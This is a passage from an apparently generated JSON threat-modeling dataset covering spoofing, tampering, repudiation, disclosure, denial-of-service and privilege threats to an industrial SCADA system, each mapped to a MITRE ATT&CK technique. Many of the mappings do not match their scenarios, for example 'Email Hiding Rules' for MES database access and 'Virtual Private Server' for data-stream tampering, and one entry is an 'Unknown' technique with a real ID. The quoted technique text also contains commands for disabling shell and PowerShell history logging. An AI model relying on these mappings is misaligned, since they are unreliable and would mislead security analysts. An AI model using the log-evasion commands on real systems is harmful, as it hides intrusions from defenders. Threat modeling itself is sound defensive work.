                "gateway spoofing",
                "cloud service",
                "data flow",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies control commands sent from the Control Center to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Control commands are not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if the communication channel does not use encryption."
                },
                {
                    "Assumption": "There are vulnerabilities in the Control Center's software.",
                    "Role": "Attacker",
                    "Condition": "Valid if the software can be exploited to change command content."
                }
            ],
            "Potential Impact": "Manipulation of industrial processes, potentially causing physical damage.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "tampering",
                "control center",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--0f593692-1270-47c6-b07c-8ee8b7eebd7a",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to field devices and reprograms PLCs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are not physically secured.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security measures are lacking at the facility."
                },
                {
                    "Assumption": "PLCs do not require authentication for reconfiguration.",
                    "Role": "Attacker",
                    "Condition": "Valid if the devices' firmware lacks authentication mechanisms."
                }
            ],
            "Potential Impact": "Alteration of control logic, leading to unsafe operational states.",
            "MITRE ATT&CK Keywords": [
                "physical access",
                "tampering",
                "PLCs",
                "field devices"
            ],
            "mitre_technique": {
                "name": "Change Operating Mode",
                "description": "Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.   Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:  \n\n* Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. (Citation: N.A. October 2017)  \n* Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) and [Program Download](https://attack.mitre.org/techniques/T0843) are disabled while in this mode. (Citation: Omron) (Citation: Machine Information Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   \n* Remote - Allows for remote changes to a PLCs operation mode. (Citation: PLCgurus 2021)    \n* Stop - The PLC and program is stopped, while in this mode, outputs are forced off. (Citation: Machine Information Systems 2007)   \n* Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. (Citation: Machine Information Systems 2007)   \n* Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. (Citation: Omron)",
                "id": "attack-pattern--2883c520-7957-46ca-89bd-dab1ad53b601",
                "technique_id": "T0858"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data streams being sent through the gateway to the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "Data streams are not encrypted between gateway and cloud.",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption protocols like TLS are not used for cloud communication."
                },
                {
                    "Assumption": "There are vulnerabilities in the gateway firmware.",
                    "Role": "Attacker",
                    "Condition": "Valid if the gateway software has unpatched security flaws."
                }
            ],
            "Potential Impact": "Injection of false data into analytics systems, skewing production decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data stream",
                "gateway",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "Virtual Private Server",
                "description": "Adversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",
                "id": "attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795",
                "technique_id": "T1583.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider modifies MES data entries without leaving a trace.",
            "Assumptions": [
                {
                    "Assumption": "MES lacks detailed logging and audit trails.",
                    "Role": "Insider",
                    "Condition": "Valid if the system does not implement comprehensive logging mechanisms."
                },
                {
                    "Assumption": "Data modifications are not cryptographically signed.",
                    "Role": "Insider",
                    "Condition": "Valid if the system does not use digital signatures for data integrity."
                }
            ],
            "Potential Impact": "Challenges in identifying the responsible party for the data tampering.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "MES",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies initiating a cyber attack due to lack of non-repudiation mechanisms in the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Control Center does not log user activities adequately.",
                    "Role": "Attacker",
                    "Condition": "Valid if system logging is insufficient."
                },
                {
                    "Assumption": "Logs can be easily erased or altered.",
                    "Role": "Attacker",
                    "Condition": "Valid if log integrity is not protected by cryptographic means."
                }
            ],
            "Potential Impact": "Inability to trace and pin responsibility for the attack.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "control center",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending critical control commands to PLCs.",
            "Assumptions": [
                {
                    "Assumption": "PLC commands are not logged with user identifiers.",
                    "Role": "User",
                    "Condition": "Valid if user activity is not logged."
                },
                {
                    "Assumption": "Communication channels do not verify user identity.",
                    "Role": "User",
                    "Condition": "Valid if user authentication and logging are inadequate."
                }
            ],
            "Potential Impact": "Difficulty in identifying and verifying the actor responsible for actions.",
            "MITRE ATT&CK Keywords": [
                "denial of responsibility",
                "repudiation",
                "PLC",
                "command logging"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is intercepted during transmission to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted in plain text over the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption is not used."
                },
                {
                    "Assumption": "Network monitoring tools are not deployed.",
                    "Role": "Attacker",
                    "Condition": "Valid if intrusion detection systems are not in place."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data and potentially business secrets.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "information disclosure",
                "network",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the MES database containing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on the MES database.",
                    "Role": "Attacker",
                    "Condition": "Valid if user roles and permissions are not properly configured."
                },
                {
                    "Assumption": "The database lacks encryption for sensitive data.",
                    "Role": "Attacker",
                    "Condition": "Valid if strong encryption standards are not applied."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive production data and operational methodologies.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "information disclosure",
                "MES",
                "database"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Logs containing sensitive information are exposed due to misconfigured access permissions.",
            "Assumptions": [
                {
                    "Assumption": "Logs are accessible without authentication.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls on logs are weak."
                },
                {
                    "Assumption": "Logs are not obfuscated or encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if sensitive information is stored in clear text"
                }
            ],
            "Potential Impact": "Sensitive data such as operational details or critical configurations are exposed.",
            "MITRE ATT&CK Keywords": [
                "log exposure",
                "information disclosure",
                "access permissions",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Cloud Infrastructure Discovery",
                "description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",
                "id": "attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d",
                "technique_id": "T1580"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Control Center with repeated requests, rendering the HMI unusable.",
            "Assumptions": [
                {
                    "Assumption": "The Control Center does not have adequate rate limiting protections.",
                    "Role": "Attacker",
                    "Condition": "Valid if the system cannot handle high volume request floods."
                },
                {
                    "Assumption": "Network traffic monitoring and blocking tools are insufficient.",
                    "Role": "Attacker",
                    "Condition": "Valid if intrusion detection and prevention systems are inadequate."
                }
            ],
            "Potential Impact": "Loss of control and monitoring capabilities, impacting manufacturing operations.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "HMI",
                "Control Center",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disables the gateway to cut off all communications between the SCADA system and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Gateway lacks redundancy and failover mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid if alternative communication paths are not available."
                },
                {
                    "Assumption": "Insufficient protective measures against physical tampering.",
                    "Role": "Attacker",
                    "Condition": "Valid if gateway can be physically accessed and tampered with easily."
                }
            ],
            "Potential Impact": "Disruption of data acquisition and analytics processes due to loss of connectivity.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "gateway",
                "communication disruption",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses malware to overload field device communication, causing RTUs to crash.",
            "Assumptions": [
                {
                    "Assumption": "RTUs do not have adequate malware protection.",
                    "Role": "Attacker",
                    "Condition": "Valid if endpoint protection is weak or non-existent."
                },
                {
                    "Assumption": "Field devices do not validate incoming traffic rigorously.",
                    "Role": "Attacker",
                    "Condition": "Valid if traffic validation mechanisms are insufficient."
                }
            ],
            "Potential Impact": "Shutdown of field devices, leading to loss of control over industrial processes.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "DoS attack",
                "field devices",
                "RTUs"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in the HMI to gain admin privileges.",
            "Assumptions": [
                {
                    "Assumption": "HMI software contains unpatched vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if there are known flaws that haven't been addressed."
                },
                {
                    "Assumption": "User accounts do not follow the principle of least privilege.",
                    "Role": "Attacker",
                    "Condition": "Valid if excessive permissions are granted to users."
                }
            ],
            "Potential Impact": "Full control over HMI and the ability to manipulate plant operations.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "HMI",
                "vulnerability exploitation",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Escape to Host",
                "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
                "id": "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665",
                "technique_id": "T1611"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a worker's compromised SCADA credentials to access higher-level systems in the network.",
            "Assumptions": [
                {
                    "Assumption": "SCADA system does not enforce multi-factor authentication.",
                    "Role": "Attacker",
                    "Condition": "Valid if only a password is required for access."
                },
                {
                    "Assumption": "Network segmentation is insufficient between SCADA and higher-level systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if lateral movement within the network is possible."
                }
            ],
            "Potential Impact": "Access to critical systems and data which should be restricted.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "SCADA",
                "network segmentation",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker installs a malicious update on a PLC, elevating control permissions.",
            "Assumptions": [
                {
                    "Assumption": "PLCs accept unsigned or unauthenticated firmware updates.",
                    "Role": "Attacker",
                    "Condition": "Valid if the update mechanism does not verify authenticity."
                },
                {
                    "Assumption": "Firmware updates are not monitored or audited.",
                    "Role": "Attacker",
                    "Condition": "Valid if there's no oversight on updates applied to devices."
                }
            ],
            "Potential Impact": "Manipulation of control logic leading to unauthorized actions and operations.",
            "MITRE ATT&CK Keywords": [
                "malicious software update",
                "PLC",
                "firmware",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate RTU to send false data to the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong authentication mechanisms between RTUs and Control Center",
                    "Role": "Security Analyst",
                    "Condition": "If authentication is weak or nonexistent."
                },
                {
                    "Assumption": "RTUs are connected via a WAN that is susceptible to packet interception",
                    "Role": "Network Engineer",
                    "Condition": "If the WAN is not secured effectively."
                }
